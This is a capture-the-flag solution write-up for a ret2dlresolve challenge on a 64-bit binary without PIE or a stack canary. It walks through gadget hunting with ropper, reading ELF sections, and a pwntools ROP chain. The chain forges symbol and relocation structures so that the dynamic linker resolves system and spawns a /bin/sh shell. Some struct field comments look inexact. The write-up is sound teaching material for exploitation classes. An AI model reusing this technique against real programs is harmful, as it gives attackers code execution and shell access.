# Ret2dlresolve:Solution

The binary is compiled with NX and Partial RELRO
```
pwn checksec chal.bin 
[*] '/root/workspace/vuln/ret2dlresolve/chal/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

and is dynamically linked to GLIBC.
```
ldd chal.bin
    linux-vdso.so.1 (0x00007ffd4a0d8000)
    libc.so.6 => /lib64/libc.so.6 (0x00007ff26e800000)
    /lib64/ld-linux-x86-64.so.2 (0x00007ff26eb17000)\
```

We need to populate rdi but the binary doesn't have any pop rdi gadgets. Using ropper we can find a gadget that moves the value of r10 into rdi and a gadget that pops r10.

```
ropper -f ./chal.bin --nocolor | grep rdi
0x0000000000401190: mov rdi, r10; ret; 
and
ropper -f ./chal.bin --nocolor | grep r10
0x000000000040118d: pop r10; ret; 
```

Then we need to get some existing structures out of the binary.
```
readelf --sections ./chal.bin | egrep "Name|.rela.plt|.dynsym|.dynstr"
   [Nr] Name              Type             Address           Offset
   [ 6] .dynsym           DYNSYM           00000000004003d0  000003d0
   [ 7] .dynstr           STRTAB           00000000004004a8  000004a8
   [11] .rela.plt         RELA             00000000004005d0  000005d0
```

We can use vmmap in pwndbg to get the address of memory that is rw and then get a number in the range that is divisible by 24.

```
0x404e10
```

Using this we can create our fake symtab, rel structures and args, as well as calculate the fields for the fake structs. 

Next we need to read our payload into writeable memory.
```
chain = cyclic(16)                 # padding
chain += p64(ret)                  # ret (align stack)

chain += p64(pop_r10)              # pop r10, ret

chain += p64(writeable_mem)        
chain += p64(mv_rdi)

chain += p64(e.plt['gets'])    
```

Then we mov the address of args into rdi, call init_plt.
```
chain += p64(pop_r10)              # pop r10, ret
chain += p64(fake_args)            
chain += p64(mv_rdi)
chain += p64(init_plt)	           # init_plt
chain += p64(dl_resolve_index)     # 0x310 (fake_rel - jmp_rel)/size of rel struct
```

Finally we build our payload, send the chain.
```
# Symbol Name
payload = b'system\x00\x00'	   # st_name (symbol name)
payload += p64(0)                  # st_info (symbol type and handling)
payload += p64(0)                  # st_other (symbol visibiliyt)

# dont change section vvvv

# Elf64 Symbol Struct
payload += p64(st_shndex)          # st_shndex (section index) (?)
payload += p64(0)                  # st_value (symbol value)
payload += p64(0)                  # st_size (symbol size)
payload += p64(0)                  # padding



# Elf64_Rel Struct
payload += p64(writeable_mem)      # r_offset (address)
payload += p64(r_info)             # r_info   (reloc type and index) (?)
payload += p64(0)                  # padding

# Arguments
payload += b'/bin/sh\0'            # /bin/sh

print(payload)

p.sendline(payload)
```

We have our flag!
```
flag{tH4ts_t43_RETurn_2URsELF}
```

Resources
* Class slides
* Demo solve script
* Louie
